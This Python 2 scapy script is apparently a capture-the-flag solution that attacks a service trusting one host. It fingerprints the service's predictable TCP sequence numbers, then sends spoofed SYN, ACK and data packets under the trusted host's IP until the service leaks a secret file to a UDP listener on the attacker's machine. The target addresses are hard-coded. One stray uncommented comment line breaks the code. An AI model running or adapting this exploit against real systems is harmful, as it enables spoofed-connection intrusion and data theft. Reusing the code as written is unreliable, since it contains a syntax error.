#!/usr/bin/env python
"""
    Chad Spensky, cspensky@cs.ucsb.edu

    Attacks a server that always starts its sequence numbers at 0, and trusts a
    specific host

    NOTES

    - First spread of differences in seq numbers:
    [-855629550, -855244755, -855233280, -852295680, -757255395, -754970340, -754967790, -754963200, -753139695, -752885715, -751633920, -604951290, -553635090, -536872410, -535153965, -506650829, -503700480, -483209954, -467522355, -453369600, -437452755, -433271520, -433250099, -332203545, -318775245, -268824570, -248323590, -234877440, -217250310, -100674765, -100270079, -99540525, -99409965, -98246400, -97328400, -97327890, -2950605, -2949075, -2297805, -2219520, -2023680, -1891590, -1695750, -992205, -970020, -13005, -11475, 0, 3570, 7905, 9690, 13005, 384540, 979200, 2292195, 2350080, 3338205, 100265490, 100670175, 100670685, 102489856, 102563805, 103602930, 231546630, 237358336, 248325120, 265094685, 281871900, 320470995, 332210176, 433258515, 434503680, 450027315, 456320205, 501350400, 504299475, 533926650, 538103040, 567075885, 571537875, 590138595, 604951290, 604962765, 623694555, 691428438, 751624995, 751632390, 751633920, 752755155, 753860580, 753917190, 754113030, 754963200, 755359470, 855237870]

    Sometimes the difference is 0!!!

    From nmap: TCP Sequence Prediction: Difficulty=262 (Good luck!)


    Strategy: Just keep hammering the service, and it should eventually pop
    out our number

    Solution: Looks like the service is just using an increasing number and
    reordering the bytes (unix timestamp), we'll just try one permutation of
    the seqn number that we got, and try to return that.
"""
# Native
import socket
import pprint
import logging
logger = logging.getLogger(__name__)
logging.basicConfig(level=logging.INFO)

# 3rd Party
from scapy.all import *
import threading

conf.verb = False

# craft our attack
trusted_ip = "45.33.41.195"
service_ip = "192.35.222.199"
serivce_port = 31337
listen_port = 31337
dump_filename = "secret.txt"


class TCPSeqnGuesser:
    def __init__(self):
        """
            Just init some globals

        :return:
        """
        self.sequences = []
        self.last_observed_seqn = 0
        self.observed_diff = {}
        self.zeros = 0
        self.seq_dict = {}

    def add_observation(self, seqn_num):
        """
            Add a new observation to our

        :param seqn_num:
        :return:
        """
        self.sequences.append(seqn_num)

        diff = seqn_num - self.last_observed_seqn

        self.last_observed_seqn = seqn_num

        if diff in self.observed_diff:
            self.observed_diff[diff] += 1
        else:
            self.observed_diff[diff] = 1

        if seqn_num in self.seq_dict:
            self.seq_dict[seqn_num] += 1
        else:
            self.seq_dict[seqn_num] = 1

        if diff == 0:
            self.zeros += 1


def udp_listener(listen_ip, port, output_file):
    """
        Listen on a UDP socket and dump all received data to the specified file

    :param listen_ip: IP to listen on
    :param port: Port to listen on
    :param output_file: Filename to dump received data to
    :return:
    """

    f = open(output_file, "w+")

    # Listen for our reply
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((listen_ip, port))

    logger.info("Listening for incoming data on (%s,%d)..."% (listen_ip,port))
    while True:
        # get our data
        data, addr = sock.recvfrom(1024)  # buffer size is 1024 bytes

        # Save the data
        f.write(data)
        print " * Received message:", data

        # We're all done here
        f.close()
        sock.close()
        sys.exit(0)

# Construct our first packet.  This is just to get our own ip
ip = IP(dst=service_ip)


# Send it and get a response
guesser = TCPSeqnGuesser()
test_num = 1
print "* Testing the responses with %d trials..."%test_num
for i in range(test_num):
    TCP_SYN = TCP(sport=serivce_port, dport=serivce_port, flags="S", seq=100+i)
    TCP_SYNACK = sr1(ip / TCP_SYN)
    guesser.add_observation(TCP_SYNACK[TCP].seq)
    # print "%10s %10s %35s" %(str(TCP_SYNACK[TCP].seq),
    #                          hex(TCP_SYNACK[TCP].seq),
    #                          bin(TCP_SYNACK[TCP].seq))

print "* Got %d reusued seqn. number out of %d tries...  Good odds?" % (
    guesser.zeros, test_num)

# log our IP
my_ip = TCP_SYNACK[IP].dst
print "* Got our ip: %s" % my_ip

# Open a UDP listener
print "* Opening UDP socket on %s:%d" % (my_ip, listen_port)
thread = threading.Thread(target=udp_listener, args=(my_ip, listen_port,
                                                dump_filename))
thread.start()

# Now send our attack payload

my_payload = my_ip+"\r\n"

# Try forever!
print "* ATTACK!!!!!"


idx = 0
while True:
    # When watching the service, it was observed using the same seqn. number
    # up to 3 times in a row.  We're just going to hammer it forever until it
    #  does that again.

    # Packet 1 - back to us (ack = X)
    # Packet 2 - attacker SYN (ack = X)
    # Packet 3 - attacker data (ack = X+1)

    if not thread.isAlive():
        print "* Thread is dead, we got it!"
        break

    # craft our packets
    attack_ip = IP(src=trusted_ip, dst=service_ip)
    TCP_SYN = TCP(sport=1337+idx, dport=serivce_port, flags="S", seq=1001)
    normal_packet = ip / TCP_SYN
    attack_packet = attack_ip / TCP_SYN


    # Send a SYN that will return to us
    TCP_SYNACK_us = sr1(normal_packet)

    # Send with attacker ip, no receive
    TCP_SYNACK_attacker = send(attack_packet)


    #
    # Try the same seqn again
    #

    Send our data packets, guessing the seqn. number
    ack_guess = TCP_SYNACK_us[TCP].seq+1

    # Send ACK
    TCP_ACK = TCP(sport=1337+idx, dport=serivce_port, flags="A", seq=1002+idx,
                  ack=ack_guess)
    send(attack_ip / TCP_ACK)
    # Send data
    TCP_PUSH = TCP(sport=1337+idx, dport=serivce_port, flags="PA", seq=1002+idx,
                   ack=ack_guess)
    send(attack_ip / TCP_PUSH / my_payload)

    #
    # try just swapping the inner two bytes
    #
    # seqn_num = struct.pack("I", TCP_SYNACK_us[TCP].seq)
    # seqn_num = seqn_num[0] + seqn_num[2] + seqn_num[1] + seqn_num[3]
    #
    # # Guess whatever seqn. number we observed, incremented by one
    # ack_guess = struct.unpack("I", seqn_num)[0] + 1
    #
    # # Send our data packets, guessing the seqn. number
    # TCP_ACK = TCP(sport=1337+idx, dport=serivce_port, flags="A", seq=1002+idx,
    #               ack=ack_guess)
    # send(attack_ip / TCP_ACK)
    #
    # TCP_PUSH = TCP(sport=1337+idx, dport=serivce_port, flags="PA", seq=1002+idx,
    #                ack=ack_guess)
    # send(attack_ip / TCP_PUSH / my_payload)

    idx += 1
    print "Attempt #%d..." % idx


# thread.terminate()
